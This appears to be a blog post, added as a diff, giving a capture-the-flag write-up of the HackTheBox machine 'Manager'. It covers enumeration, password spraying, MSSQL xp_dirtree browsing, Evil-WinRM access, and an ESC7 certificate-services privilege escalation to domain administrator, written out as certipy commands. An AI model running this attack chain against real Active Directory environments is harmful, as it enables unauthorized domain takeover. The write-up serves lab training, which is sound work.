@@ -1,0 +1,123 @@
+---
+layout: post
+title: "Manager cfec3cd46494480db7224387594ecdf2"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Manager
+
+HackTheBox: Medium
+
+## 1: Enumeration
+
+- nmap scanning
+
+ 
+
+![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled.png' | relative_url }})
+
+With Rustscan we found 
+
+> 445 SMB
+1433 mssql
+464 kpass
+88 Kerberos
+> 
+
+![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_1.png' | relative_url }})
+
+That’s how we find active users in the machine
+
+~Spray all the users found using Crackmapexec
+
+![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_2.png' | relative_url }})
+
+## 2: User flag
+
+> Crackmapexec is a useful tool but it is not maintained anymore so we are going to chanche a .py file something with the ssl version.
+> 
+
+Enum shared resources
+
+<aside>
+💡 Impacket-smbclient
+Impacket-mssqlclient
+
+</aside>
+
+![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_3.png' | relative_url }})
+
+Once inside of shared resources we were able to access the database tables, we started looking into their contents. We hace content in xp_dirtree
+
+We can check documentation to find web page resources 
+
+```bash
+ EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
+```
+
+find a website backup  with creds, use wget to download it locally, using evil-wirm to access
+
+![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_4.png' | relative_url }})
+
+## 3: Priv esc
+
+```bash
+whoami /groups /priv
+```
+
+![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_5.png' | relative_url }})
+
+Evil winrm a advantage, the capacity of upload and create files from remote machine
+
+```bash
+upload cerfity.exe
+./Certify.exe find /vulnerable
+```
+
+> Now we’re gonna use certipy, with an auth we get  specific vulnerabilities and exploit them
+> 
+
+```bash
+certipy find -u user@--- -p "rtgre" -enable -vulnearable -target manager.htb
+```
+
+Vulnerable to ESC7 find mor info [HERE](https://github.com/ly4k/Certipy#esc7) and exploit
+
+```bash
+#Add an officer named 'raven' to the CA named 'manager-DC01-CA' given managecertificate rights
+certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password '<password>' 
+
+#Enable a certificate template named 'SubCA' for the CA 'manager-DC01-CA'.
+certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password '<password>' 
+
+#Submit a certificate request for the template 'SubCA' to the CA 'manager-DC01-CA'.
+#It fails but we just need the private key to sign the certificate to issue directly
+certipy req -username raven@manager.htb -password '<password>' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb 
+
+#Issue the certificate based on the request submitted.
+certipy ca -ca "manager-DC01-CA" -issue-request <private_key_id> -username 'raven@manager.htb' -password '<password>' 
+
+#Retrieve the issued certificate.
+certipy req -username 'raven@manager.htb' -password '<password>' -ca "manager-DC01-CA" -target manager.htb -retrieve <private_key_id>
+```
+
+You’ve got a hash for admin with
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
+```
+
+Whether for some reason it shows you an error message try to sync servers like this
+
+```bash
+sudo ntpdate -u manager.htb
+```
+
+And finally
+
+```bash
+evil-winrm -i 10.10.11.236 -u administrator -H password
+```
+
+Machine pwned!!!
